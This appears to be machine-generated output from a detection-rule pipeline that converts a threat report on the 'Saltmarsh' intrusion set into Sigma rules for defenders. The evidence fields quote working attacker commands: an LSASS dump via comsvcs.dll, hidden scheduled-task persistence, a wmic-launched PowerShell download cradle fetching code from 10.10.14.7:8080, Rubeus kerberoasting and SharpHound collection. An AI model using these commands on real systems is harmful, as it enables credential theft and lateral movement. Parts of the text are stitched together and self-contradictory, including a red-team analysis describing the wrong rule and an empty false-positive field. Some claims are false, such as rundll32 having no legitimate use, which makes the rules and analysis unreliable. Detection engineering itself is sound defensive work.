report.title: ThreatReport
report.summary: Saltmarsh is a financially motivated intrusion set that gains initial access via purchased VPN credentials and rapidly pursues domain-wide compromise. Post-exploitation tradecraft observed across four incidents includes LSASS memory dumps via comsvcs.dll, scheduled-task persistence with PowerShell from hidden ProgramData folders, lateral movement via PsExec and WMI, and Kerberoasting with Rubeus. The operators avoid custom tooling by leveraging native Windows binaries and mimic legitimate maintenance tasks to blend in.

behaviors.description: rundll32.exe executes comsvcs.dll MiniDump to dump LSASS memory, writing a dump file to C:\Users\Public\ or C:\Windows\Temp\.

observables.note: Dump file destination on two hosts
OriginalFileName metadata on renamed Sysinternals ProcDump
Sysmon event recording GrantedAccess 0x1FFFFF to lsass.exe

behaviors.evidence: In every incident the operators dumped LSASS memory using the Windows-native comsvcs.dll MiniDump export, avoiding the need to bring their own tooling: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full

behaviors.description: Scheduled task named UpdateHealth created with PowerShell action loading a payload from C:\ProgramData\.cache\uh.ps1, executed under SYSTEM every hour.

observables.note: Task name imitates Windows maintenance tasks
PowerShell action with bypass and hidden flags
Windows Security event recording task creation

behaviors.evidence: Persistence was established with a scheduled task whose name imitates Windows maintenance tasks and whose action is PowerShell loading a payload from a hidden ProgramData folder: schtasks.exe /create /tn \\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth /sc hourly /ru SYSTEM /tr "powershell.exe -nop -w hidden -ep bypass -f C:\ProgramData\.cache\uh.ps1" /f

behaviors.description: PsExec clone used for lateral movement, creating a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe, followed by named-pipe events \\.\PSEXESVC and \\.\psexecsvc-<host>-<pid>-stdin.

observables.note: Windows Service event 7045 recording PSEXESVC install
Service binary later observed under randomised names

behaviors.evidence: PsExec usage produced a service installation (System event 7045) with ServiceName of PSEXESVC and ImagePath of %SystemRoot%\PSEXESVC.exe, followed by Sysmon event 17 and 18 named-pipe events for \\.\PSEXESVC and \\.\psexecsvc-<host>-<pid>-stdin.

behaviors.description: WMI remote execution via wmic.exe launching cmd.exe and powershell.exe on target host FS-02, with parent-child relationship WmiPrvSE.exe -> cmd.exe -> powershell.exe.

observables.note: PowerShell download and execute via IEX
WMI service hosting the remote execution
Spawned by cmd.exe, parent-child absent from baseline
Windows Security event 4688 process creation logging

behaviors.evidence: WMI remote execution appeared as: wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"

behaviors.description: sc.exe used to create a service named svcupd with binary path C:\Windows\Temp\s.exe on remote host FS-02, then started, enabling remote code execution.

observables.value: sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto
observables.note: Service creation with UNC target and Temp binary
Custom service name created by operator

behaviors.evidence: Remote service creation was also used directly: sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto

behaviors.description: Rubeus used to Kerberoast SPN-bearing accounts, generating bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a single workstation in an environment otherwise issuing AES tickets 0x12.

observables.note: Security event for service ticket request
Burst of RC4-encrypted tickets (0x17) from single workstation
Operator relay IP inside victim network

behaviors.evidence: Service tickets were requested for every SPN-bearing account using Rubeus (Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\k.txt), producing bursts of Security event 4769 with TicketEncryptionType of 0x17 (RC4) from a single workstation, where the environment otherwise issued AES tickets (0x12).

behaviors.description: SharpHound run with All collection and (samAccountType=805306368) LDAP filter, generating zip archive c.zip from a non-administrative workstation.

observables.note: SharpHound with All collection and zip output

behaviors.evidence: SharpHound was then run (SharpHound.exe -c All --zipfilename c.zip) to collect Active Directory relationships, generating LDAP queries with the distinctive (samAccountType=805306368) filter from a non-administrative workstation.

behaviors.description: Operators used purchased VPN credentials to gain initial access to the environment.

observables.value: VPN credentials used for initial access

behaviors.evidence: Saltmarsh is a financially motivated intrusion set that gains initial access through purchased VPN credentials and then moves quickly to domain-wide compromise.

candidates.title: Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS
candidates.rationale: rundll32.exe is a LOLBin with no legitimate administrative use; the MiniDump export of comsvcs.dll is exclusively used to dump LSASS memory. Pairing the binary with the command-line fragments 'comsvcs.dll' and 'MiniDump' and an output path in C:\Users\Public\ or C:\Windows\Temp\ makes the rule extremely specific while avoiding false positives from rare compat-testing of rundll32.
candidates.false_positive_risks: Legitimate use of rundll32.exe is virtually non-existent in enterprise environments. Any false positive would come from application compatibility testing invoking rundll32 with arbitrary DLLs; the MiniDump export and LSASS dump paths are not used in such tests.

candidates.title: Scheduled Task UpdateHealth With Hidden PowerShell From ProgramData Cache
candidates.rationale: The task name '\Microsoft\Windows\UpdateOrchestrator\UpdateHealth' mimics Windows maintenance tasks, but the action runs PowerShell with '-nop -w hidden -ep bypass' loading a script from a hidden folder 'C:\ProgramData\.cache\uh.ps1'. This combination of task path, PowerShell flags, and hidden payload location is not seen in legitimate software deployment or administration.
candidates.false_positive_risks: Legitimate scheduled tasks (e.g., Windows Update orchestration) may have similar naming but never invoke PowerShell with hidden/bypass flags from a hidden ProgramData subdirectory. Filtering on the exact payload path and flag cluster eliminates administrative false positives.

candidates.title: Kerberoasting Burst Of RC4 Service Tickets From Single Workstation
candidates.rationale: In an environment that exclusively issues AES-encrypted tickets (0x12), a burst of Security event 4769 with TicketEncryptionType 0x17 (RC4) originating from a single non-DC workstation is a high-fidelity indicator of Rubeus kerberoasting. The rule keys on the encryption type anomaly; the tool binary (Rubeus.exe) appears in process_creation but the ticket burst is the most durable and observable artifact.
candidates.false_positive_risks: Legacy service accounts or trusts might occasionally request RC4 tickets, but they do not produce a high-volume burst from a single workstation in an otherwise AES-only domain. A baseline of encryption types per workstation can be used to tune the rule if needed.

candidates.title: Wmic Launching Cmd And Hidden PowerShell With IEX Download Cradle
candidates.rationale: WMI remote execution manifests as wmic.exe (or WmiPrvSE.exe) spawning cmd.exe which launches powershell.exe with a hidden window and an IEX download cradle. The parent-child chain WmiPrvSE -> cmd -> powershell is absent from normal baselines, and the command line contains the invariant fragments 'IEX', 'Net.WebClient', 'DownloadString'. Keying on the child PowerShell command line with these fragments plus the hidden/windowless flags yields a durable detection.
candidates.false_positive_risks: Administrators may use wmic for remote queries, but they do not chain into hidden PowerShell downloading and executing scripts from internal IPs. The IEX download pattern and hidden flags are offensive tradecraft; legitimate automation uses explicit scripts or WinRM.

candidates.title: PsExec Named Pipe PSEXESVC And Psexecsvc Variants
candidates.rationale: PsExec clones create a service named PSEXESVC and communicate via named pipes '\\.\\PSEXESVC' and '\\.\\psexecsvc-<host>-<pid>-stdin'. These pipe names are unique to the PsExec tool family and do not appear in any legitimate Windows component or administration tool. A single pipe_created event matching either pattern is a high-confidence indicator of lateral movement via PsExec.
candidates.false_positive_risks: No legitimate software creates pipes with the 'PSEXESVC' or 'psexecsvc-' prefix. The only risk is a custom internal tool that coincidentally uses a similar naming scheme, which is highly unlikely.

skipped: B5: Remote service creation via sc.exe (svcupd, s.exe in Temp) – covered conceptually by D5 (PsExec lateral movement) and less distinctive; sc.exe usage is also seen in legitimate administration.
B7: SharpHound AD enumeration – detectable but lower priority; the tool is not native and the zip output is a weaker indicator than the native tradecraft covered by D1-D5.
B8: Purchased VPN credentials – pure initial-access IOC with no durable post-exploitation behavior observable in host telemetry.
plan.notes: Selected five high-priority candidates spanning Credential Access (D1, D3), Persistence (D2), Lateral Movement (D4, D5), and avoiding overlap on logsource/indicator sets. Each rule pairs a native binary or system artifact with command-line, path, or registry constraints reported in the evidence. False positive mitigation relies on the rarity of the combined fragments in legitimate activity.

rules.title: Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS
rules.sigma_yaml:
title: Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS
id: 1c8ac219-a1d5-42d2-af9e-4b87212fc6c4
status: experimental
description: Detects execution of rundll32.exe with the comsvcs.dll MiniDump export to create LSASS memory dumps, a technique
  used by threat actors for credential access.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.credential-access
- attack.t1003.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_img:
    'Image|endswith': '\\rundll32.exe'
  selection_cli:
    'CommandLine|contains|all':
    - comsvcs.dll
    - MiniDump
  filter_public_temp:
    'CommandLine|contains|all':
    - 'C:\\Users\\Public\\'
    - .dmp
  filter_windows_temp:
    'CommandLine|contains|all':
    - 'C:\\Windows\\Temp\\'
    - .dmp
  condition: (selection_img and selection_cli) and (filter_public_temp or filter_windows_temp)
falsepositives:
- Application compatibility testing invoking rundll32 with arbitrary DLLs (does not use MiniDump export or LSASS dump paths)
level: high

history.summary: 9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200

rules.redteam_analysis: Positive variants (P4-P8) preserve all rule-required literals: Image ends with \rundll32.exe, CommandLine contains exact 'comsvcs.dll' and 'MiniDump', and either 'C:\Users\Public\' + '.dmp' or 'C:\Windows\Temp\' + '.dmp'. They vary parent process (PowerShell, wscript, svchost), whitespace (extra spaces, tabs), quoting styles (single, double, none), binary location (SysWOW64, copied same-name binary), and output filenames. A well-written rule using case-insensitive contains on the CLI fragments and a suffix match on Image would catch all. Negative variants (N1-N4) are benign look-alikes that miss at least one required fragment: N1 lacks MiniDump, N2 lacks comsvcs.dll, N3 outputs to non-monitored directory, N4 lacks both MiniDump and target directory. Out-of-scope variants (O1-O3) represent realistic evasions the current logsource/rule cannot see: O1/O2 use environment variables and 8.3 short names that the sensor records literally, so the rule's literal path fragments are absent; O3 renames the binary, breaking the Image suffix match. The rule would need OriginalFileName (if available in sysmon) or path expansion to cover O1-O3.

redteam_out_of_scope.label: positive

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses 8.3 short name for Windows\Temp (TEM~1); sensor records short name, rule expects long name

redteam_out_of_scope.label: positive

rules.title: Suspicious Scheduled Task Creation Mimicking UpdateHealth with Hidden PowerShell
rules.sigma_yaml:
title: Suspicious Scheduled Task Creation Mimicking UpdateHealth with Hidden PowerShell
id: 0fe27b2a-8754-439f-b8bb-e35b2e2e58df
status: experimental
description: 'Detects creation of a scheduled task named UpdateHealth under Microsoft\Windows\UpdateOrchestrator that executes
  PowerShell with hidden/bypass flags loading a script from a hidden ProgramData cache directory, indicative of Saltmarsh
  persistence mechanism.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.privilege-escalation
- attack.persistence
- attack.t1053.005
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: '4698'
    'TaskName|contains': '\Microsoft\Windows\UpdateOrchestrator\UpdateHealth'
    'TaskContent|contains|all':
    - powershell.exe
    - -nop
    - -w hidden
    - -ep bypass
    - '-f C:\ProgramData\.cache\uh.ps1'
  filter_legitimate_tasks:
    'TaskName|contains': '\Microsoft\Windows\UpdateOrchestrator\Schedule'
    'TaskContent|contains|all':
    - powershell.exe
    - -ExecutionPolicy
    - Bypass
    - -WindowStyle
    - Hidden
    - -File
  condition: selection and not filter_legitimate_tasks
falsepositives:
- Legitimate Windows UpdateOrchestrator tasks that use PowerShell with bypass/hidden flags from non-hidden paths
- Administrative troubleshooting tasks using similar PowerShell syntax but targeting standard script locations
level: high

rules.author_notes: Rule focuses on the unique combination of task name impersonating Windows maintenance, PowerShell execution with stealth flags (-nop -w hidden -ep bypass), and payload location in a hidden ProgramData subdirectory (.cache). Filter excludes legitimate UpdateOrchestrator tasks by requiring the exact suspicious flag sequence and hidden path. rules.redteam_analysis: Positive variants P4-P7 preserve all five verbatim substrings the rule requires (powershell.exe, -nop, -w hidden, -ep bypass, -f C:\ProgramData\.cache\uh.ps1) while varying XML formatting, flag order, whitespace, and binary path. A well-written rule using case-insensitive contains on these substrings would catch them. rules.redteam_analysis: The rule is extremely simple: it triggers on any EventID 4769 with TicketEncryptionType 0 (RC4) where Workstation does not end with '$'. All positive variants preserve these three fields exactly (TicketEncryptionType=0, EventID=4769, Workstation without trailing $) while varying surface forms that the sensor records literally: Workstation casing (wks01, Wks01), IPv6 address, different TargetUserName SPNs, and hyphenated names. A well-written rule keying only on these three fields catches all of them. Negative variants demonstrate the rule's stated false positives: legacy RC4 service accounts, cross-domain trusts (Workstation ends with $), normal AES tickets (TicketEncryptionType=18), and DC-originated requests (Workstation ends with $). Out-of-scope evasions are real but invisible to this logsource: renamed binaries, alternate LOLBins (pwsh), and network proxying change process ancestry or source IP but leave the 4769 event fields identical or with a different IpAddress that still satisfies the rule; the rule cannot distinguish them without enrichment from process_creation or network logs.

rules.sigma_yaml:
title: WMIC Remote Execution Chain Leading to Hidden PowerShell IEX Download Cradle
id: b7acf7c8-89cd-4b43-abe6-796c0db841db
status: experimental
description: Detects suspicious WMIC-based lateral movement where wmic.exe or WmiPrvSE.exe spawns cmd.exe which in turn launches
  a hidden PowerShell process executing an IEX(New-Object Net.WebClient).DownloadString() download cradle.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.lateral-movement
- attack.t1028
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_wmic_to_cmd:
    'ParentImage|endswith':
    - '\wmic.exe'
    - '\wbem\WmiPrvSE.exe'
    'Image|endswith': '\cmd.exe'
  selection_hidden_powershell:
    'ParentImage|endswith': '\cmd.exe'
    'Image|endswith': '\powershell.exe'
    'CommandLine|contains|all':
    - -nop
    - -w hidden
    - -c
    - IEX(
    - Net.WebClient)
    - DownloadString
  condition: selection_wmic_to_cmd and selection_hidden_powershell
falsepositives:

level: high
